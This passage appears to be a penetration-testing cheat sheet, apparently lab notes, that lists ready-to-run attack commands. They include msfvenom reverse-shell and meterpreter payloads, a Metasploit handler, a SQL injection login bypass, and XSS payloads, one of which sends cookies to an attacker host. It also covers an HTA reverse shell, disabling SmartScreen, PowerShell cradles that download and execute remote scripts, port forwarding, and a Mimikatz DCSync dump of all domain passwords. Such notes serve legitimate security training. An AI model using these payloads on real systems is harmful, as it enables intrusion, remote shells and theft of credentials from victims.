	msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl


## Shellcode

	For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

	Linux Based Shellcode
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

	Windows Based Shellcode
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

	Mac Based Shellcode
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>


	Handlers

	Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

	use exploit/multi/handler
	set PAYLOAD <Payload name>
	set LHOST <LHOST value>
	set LPORT <LPORT value>
	set ExitOnSession false
	exploit -j -z

	Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘

# SQL Injection

```
username: tom' or 1=1 LIMIT 1;#
```

# Cross Site Scripting (XSS)
Cheatsheet
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

## XSS Alert
```html
<script>alert(‘XSS’)</script>
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
```

## XSS Iframe
```bash
# Start a listener on your attacking machine
sudo nc -nvlp 4444
```
```html
# input the code below in to the vulnerable appliction
<iframe src=http://192.168.119.152:4444/report height=”0” width=”0”></iframe>
```

## XSS Steal Admin Cookie
```bash
# Start a listener on your attacking machine
sudo nc -nvlp 80
```
```html
# input code below in to the vulnerble web app
<script>new Image().src="http://192.168.119.152/cool.jpg?output="+document.cookie;</script>
```
### Using the cookie
Use Firefox-Addon "Cookie Editor" to use the cookie:
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/

# HTML Application Reverse Shell

## Use msfvenom to create a reverse shell in windows
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.152 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

# Post Exploitation


## Disable Smart Screen
Run this from Windows Command Prompt
```
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0
```
## Host your own smb server to transfer files to target
This will run a smb server called \\\kali on your machine
```
 sudo impacket-smbserver kali /home/kali -smb2support -username kali -password kali
 ```

 On Windows host (target machine connecting back to your new smb share)
 ```
 net use k: \\192.168.119.152\kali /user:kali kali
The command completed successfully.


C:\>k:

K:\>
```

# Port forwarding

## netsh
We are trying to forward traffic on local socket 192.168.152.10:4455 to remote socket 172.16.152.5:445

Windows 2016 Server: 172.16.152.5
Windows 10 Client: 192.168.152.10

### Forward traffic from local port 4455 to remote machine
```
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.152.10 connectport=445 connectaddress=172.16.152.5
```

### Permit traffic from anywhere to local port 4455
```
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.152.10 localport=4455 action=allow
```

### Verify Attacker Machines uses SMB2
```
$ grep "SMB2" "/etc/samba/smb.conf"
min protocol = SMB2
```

### Mount the Win10 Share on the Attacker box
```
sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //192.168.152.10/Data -o username=Administrator,password=lab /mnt/win10_share
ls -l /mnt/win10_share/
```

## plink.exe
To forward local port 3306 (from target) to the attacker (192.168.119.152) local port 1235 run the following command:
```
cmd /c echo y | plink.exe -batch -ssh -l kali -pw kali -R 192.168.119.152:1235:127.0.0.1:3306 192.168.119.152
```

# AD Enumeration
## Powershell Notes
Execution Policy Unrestricted
```
set-executionpolicy unrestricted
```
## Powerview

### Download and execute in memory
```
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.152/powerview.ps1');Get-NetSession -ComputerName dc01 | Format-Table"

powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.152:40000/Invoke-PowerShellTcp.ps1')"
```
### See who is logged in to a domain controller
```
C:\tools\active_directory> Import-Module .\PowerView.ps1
Get-NetSession -ComputerName dc01 | Format-Table
```
### Enumerate Local Admin
```
Invoke-EnumerateLocalAdmin | Format-Table
```

# Mimikatz

## Dump all passwords
```
privilege::debug
lsadump::dcsync /domain:corp.com /all /csv
```

# Powershell Unrestricted Executin Policy bypass
```
set-executionpolicy unrestricted
```

# Metasploit 
Meterpreter cheat sheet:
https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf

## Nmap Scanning
```
db_nmap 10.11.1.8 -A -Pn
```
## Payload Types
![image](https://gist.github.com/ssstonebraker/f25e2f1f6458da6dc074a1e7af79b773/raw/images---Thu_Apr_16_2020_1587053138991.png)

## Searching

### modules
    
	msf5 > search smb type:auxiliary

### Payloads
```
search meterpreter type:payload
```

## Cheatsheet
![image](https://gist.github.com/ssstonebraker/f25e2f1f6458da6dc074a1e7af79b773/raw/images---Thu_Apr_16_2020_1587051780275.png)
![image](https://gist.github.com/ssstonebraker/f25e2f1f6458da6dc074a1e7af79b773/raw/images---Thu_Apr_16_2020_1587051801949.png)